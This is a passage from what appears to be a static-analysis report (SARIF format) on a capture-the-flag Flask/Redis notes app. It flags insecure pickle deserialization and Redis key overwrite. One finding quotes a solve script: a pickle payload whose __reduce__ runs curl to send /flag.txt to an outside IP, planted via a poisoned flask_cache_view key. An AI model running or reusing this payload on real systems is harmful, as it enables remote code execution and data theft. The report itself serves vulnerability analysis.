                "severity": "high"
              }
            },
            {
              "id": "CACHE_POISONING",
              "shortDescription": {
                "text": "笔记接口允许任意 Redis 键覆盖，绕过预期过滤"
              },
              "properties": {
                "cwe": "",
                "severity": "high"
              }
            }
          ]
        }
      },
      "results": [
        {
          "ruleId": "DESERIALIZATION",
          "level": "error",
          "message": {
            "text": "app.py:43: redis.setex(name=title, value=content, time=3)  # Note will only live for max 30 seconds\nsolve.py:6-10: import pickle\nclass pwn(object):\n    def __reduce__(self):\n        return os.system, ('curl http://216.165.2.48:9999/ --data \\\"$(cat /flag.txt)\\\"',)\np = b'!' + pickle.dumps(pwn())\npost('12380:5000/', files={\"content\": io.BytesIO(p)}, data={\"title\": \"flask_cache_view//test1\"})"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "app.py"
                },
                "region": {
                  "startLine": 0,
                  "snippet": {
                    "text": "redis.setex(name=title, value=content, time=3)"
                  }
                }
              }
            }
          ]
        },
        {
          "ruleId": "CACHE_POISONING",
          "level": "error",
          "message": {
            "text": "app.py:32: title = request.form.get('title', default=None)\napp.py:43: redis.setex(name=title, value=content, time=3)  # Note will only live for max 30 seconds"
          },
          "locations": [
            {
